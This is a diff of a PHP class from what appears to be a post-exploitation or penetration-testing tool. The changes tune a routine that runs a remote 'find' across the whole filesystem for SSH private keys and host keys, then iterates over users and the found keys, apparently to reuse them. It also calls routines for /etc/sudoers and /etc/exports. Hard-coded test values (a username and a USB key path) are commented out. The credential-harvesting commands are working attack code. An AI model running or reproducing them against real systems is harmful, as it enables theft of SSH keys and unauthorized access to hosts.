@@ -421,9 +421,8 @@ lxc launch SomeAlias MyMachine
     
     public function misc($stream){
         $this->titre(__FUNCTION__);
-
         
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys($stream,"/");$this->pause();
+        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys($stream);$this->pause();
        return 0 ;
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_sudoers($stream);$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_exports($stream);$this->pause();
@@ -654,13 +653,14 @@ lxc launch SomeAlias MyMachine
         $data = "find $path2search \( -name \"id_dsa\" -o -name \"id_rsa\" -o -name \"ssh_host_key\" -o -name \"ssh_host_rsa_key\" -o -name \"ssh_host_dsa_key\" -o -name \"identity\"  \) -exec ls {} 2>/dev/null \;";
         $filter = "| grep -i -Po \"^(/[a-z0-9\-\_\.]{1,})*\" | sort -u ";
         $tab_privkeys = $this->req_tab($stream,$data,$this->stream_timeout*3,$filter);
-
+        $this->pause();
+        
         $this->article("All Priv Keys Location", $this->tab($tab_privkeys));
         $tab_users_shell = $this->ip2users4shell();
         if (empty($tab_users_shell)) $tab_users_shell = $this->ip2users();
         
-        $tab_users_shell = array("hbeale");
-        $tab_privkeys = array("/media/USB_1/Stuff/Keys/id_rsa");
+        //$tab_users_shell = array("hbeale");
+        //$tab_privkeys = array("/media/USB_1/Stuff/Keys/id_rsa");
         
         if (!empty($tab_privkeys)){
             foreach ($tab_privkeys as $remote_privkey_path){
@@ -675,6 +675,8 @@ lxc launch SomeAlias MyMachine
         }
         }
     }
+    
+    
     public function users2pass($stream,$user2name, $user2pass){
         $this->titre(__FUNCTION__);
         $ssh_ports = $this->ip2ports4service("ssh");
@@ -712,6 +714,7 @@ lxc launch SomeAlias MyMachine
     
     public function misc2keys($stream,$path2search){
         $this->titre(__FUNCTION__);
+        $path2search = "/";
         $this->misc2keys4users($stream,$path2search);$this->pause(); // OK 
         $this->misc2keys4info($stream,$path2search);$this->pause();        
         $this->misc2keys4authorized_keys_file($stream,$path2search);$this->pause();
